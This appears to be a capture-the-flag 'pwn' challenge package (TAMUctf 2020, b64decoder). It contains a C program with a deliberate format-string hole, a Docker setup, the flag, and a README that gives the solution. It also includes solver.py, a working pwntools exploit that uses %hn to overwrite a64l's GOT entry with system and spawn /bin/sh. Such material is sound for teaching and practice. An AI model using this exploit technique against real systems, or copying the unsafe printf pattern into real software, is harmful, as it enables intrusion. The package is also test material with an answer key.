{
    "b64decoder": "[Binary file or unsupported type: c:\\users\\jomue\\tamuctf-2020-master\\tamuctf-2020-master\\pwn\\b64decoder\\b64decoder]",
    "b64decoder.c": "#include \"stdio.h\"\n#include \"stdlib.h\"\n\n\nint main() {\n    system(\"echo Base64 is an encoding that represents binary data in ASCII string format.  \");\n    printf(\"Each number from 0 to 63 is mapped to an ASCII character.  For example, 'z' is %ld\\n\", a64l(\"z\"));\n    printf(\"Base64 Decoder: Powered by a64l (0x%x)\\n\", a64l);\n    printf(\"%s\", \"Enter your name!  \\n\");\n    fflush(stdout);\n    char name[32];\n    fgets(name, sizeof(name), stdin);\n    printf(\"Welcome, \");\n    printf(name);\n    printf(\"\\n\");\n    fflush(stdout);\n    while (1) {\n        printf(\"Please enter input to be decoded: \\n\");\n        char input[256];\n        fgets(input, sizeof(input), stdin);\n        long out = a64l(input);\n        printf(\"%d\\n\", out);\n        fflush(stdout);\n    }\n    return 0;\n}",
    "Dockerfile": "FROM debian:bullseye-slim as build\n\nRUN apt update; apt -y install build-essential gcc-multilib\n\nCOPY b64decoder.c /tmp/b64decoder.c\nRUN gcc -o /tmp/b64decoder -Wl,-z,norelro -no-pie -m32 /tmp/b64decoder.c\n\nFROM debian:buster-slim\n\nenv DEBIAN_FRONTEND=\"noninteractive\"\n\nRUN apt-get update && apt-get install socat -y\n\nRUN dpkg --add-architecture i386; apt update; apt install -y libc6:i386\n\nRUN groupadd ctf\n\nRUN mkdir /pwn\n\nCOPY --from=build /tmp/b64decoder /pwn/b64decoder\nCOPY flag.txt /pwn/flag.txt\nCOPY start.sh /pwn/start.sh\n\nRUN useradd -G ctf --home=/pwn pwnuser\n\nRUN chown -R pwnuser /pwn\nRUN chmod -R 555 /pwn\n\nEXPOSE 2783\n\nENTRYPOINT [\"/pwn/start.sh\"]\n",
    "flag.txt": "gigem{b1n5h_1n_b45364?}",
    "libc.so.6": "[Binary file or unsupported type: 6]",
    "README.md": "## Description\n\n\nWe put together a demo for our high performance computing server.  Why don't you check it out?  \n\n[libc.so.6](libc.so.6)\n[b64decoder](b64decoder)\n\n\n## Documentation\n\nFairly straightforward %n formatting challenge.  \n\n### Setup\n\n1. docker build . -t b64decoder\n2. docker run --rm -it -p 2783:2783 b64decoder\n\n## Solution\n\nUse %n to overwrite a64l with system in got.plt and then pass \"a64l\" whatever argument you want.  The address of a64l and system shift around so I provide the version of libc in the container.  solver.py will do the exploit and give you shell.  ",
    "solver.py": "from pwn import *\n\n\np = remote('localhost', 2783)\nbinary = ELF(\"./b64decoder\")\nlibc = ELF(\"./libc.so.6\")\nprint(p.recvline())\n# print(p.recvline())\nprint(p.recvline())\n\na64_addr = int(str(p.recvline()).split(\"(\")[1].split(\")\")[0],16)\n\nsystem_lower = (a64_addr - (libc.symbols.a64l - libc.symbols.system)) & 0xFFFF\npayload = bytearray()\npayload += p32(binary.got['a64l'])\npayload += \"%{}x\".format(str(system_lower-4)).encode('ascii')\npayload += \"%71$hn\".encode('ascii')\n\np.sendline(payload)\np.sendline(\"/bin/sh\")\np.interactive()\n",
    "start.sh": "#!/bin/bash\n\nwhile : \ndo\n    su -c \"exec socat TCP-LISTEN:2783,reuseaddr,fork EXEC:/pwn/b64decoder,stderr\" - pwnuser;\ndone\n",
    "category": "Pwn"
}